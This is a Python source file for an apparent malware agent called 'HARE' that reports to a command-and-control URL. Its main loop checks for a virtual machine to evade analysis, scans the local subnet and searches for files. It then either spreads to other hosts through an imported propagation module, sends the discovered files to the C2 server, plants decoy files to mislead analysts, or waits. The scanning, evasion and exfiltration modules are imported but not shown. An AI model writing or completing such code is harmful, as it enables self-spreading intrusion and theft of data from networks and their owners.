import logging
import time
from enum import Enum, auto

# --- HARE Core Components ---

class Goal(Enum):
    """The primary goals the HARE can pursue."""
    PROPAGATE = auto()
    EXFILTRATE = auto()
    MISDIRECT = auto()
    DORMANT = auto()

class HareAgent:
    def __init__(self, c2_url, initial_subnet="192.168.1."):
        self.c2_url = c2_url
        self.subnet = initial_subnet
        self.current_goal = Goal.DORMANT
        self.environment_profile = {}
        logging.info("HARE Agent Initialized.")

    def run_situational_awareness(self):
        """
        Gathers intelligence about the current environment to inform decisions.
        """
        logging.info("HARE: Running situational awareness protocols...")
        from modules.anti_analysis import is_virtual_machine
        from modules.scanner import intelligent_scan
        from modules.discovery import discover_files

        self.environment_profile['is_vm'] = is_virtual_machine()
        self.environment_profile['network_targets'] = intelligent_scan(self.subnet)
        self.environment_profile['valuable_files'] = discover_files('image', '.') # Example

        logging.info(f"HARE: Environment profile updated: {self.environment_profile}")

    def select_goal(self):
        """
        Analyzes the environment profile to select the most appropriate goal.
        """
        logging.info("HARE: Analyzing environment and selecting goal...")

        if self.environment_profile.get('is_vm', False):
            self.current_goal = Goal.MISDIRECT
            logging.info("HARE: Sandbox detected. Goal set to MISDIRECT.")
            return

        if len(self.environment_profile.get('network_targets', [])) > 1:
            self.current_goal = Goal.PROPAGATE
            logging.info("HARE: Multiple network targets found. Goal set to PROPAGATE.")
            return

        if self.environment_profile.get('valuable_files'):
            self.current_goal = Goal.EXFILTRATE
            logging.info("HARE: Valuable files found on isolated host. Goal set to EXFILTRATE.")
            return

        self.current_goal = Goal.DORMANT
        logging.info("HARE: No immediate opportunities found. Goal set to DORMANT.")

    def execute_action(self):
        """
        Executes the action corresponding to the current goal.
        """
        logging.info(f"HARE: Executing action for goal: {self.current_goal.name}")

        if self.current_goal == Goal.PROPAGATE:
            from modules.ape import ApeAgent # Use the APE for propagation
            ape = ApeAgent(self.c2_url, self.subnet)
            ape.run() # This is a simplification; we'd integrate more smoothly

        elif self.current_goal == Goal.EXFILTRATE:
            from modules.ace import ace_exfiltrate
            for f in self.environment_profile['valuable_files']:
                try:
                    with open(f, 'rb') as file_data:
                        ace_exfiltrate(file_data.read(), self.c2_url)
                except Exception as e:
                    logging.error(f"HARE: Failed to exfiltrate {f}: {e}")

        elif self.current_goal == Goal.MISDIRECT:
            logging.info("HARE: Running misdirection tactics (e.g., creating decoy files)...")
            # Placeholder for misdirection logic
            with open("decoy_document.txt", "w") as f:
                f.write("This is a decoy file to mislead analysts.")

        elif self.current_goal == Goal.DORMANT:
            logging.info("HARE: Entering dormant state. No action taken.")

    def run(self):
        """The main loop for the HARE agent."""
        logging.info("--- HARE Engine Unleashed ---")
        while True:
            self.run_situational_awareness()
            self.select_goal()
            self.execute_action()

            logging.info("HARE: Cycle complete. Sleeping for 5 minutes...")
            time.sleep(300)

def unleash_hare(c2_url, subnet):
    """Entry point to start the HARE engine."""
    agent = HareAgent(c2_url, subnet)
    agent.run()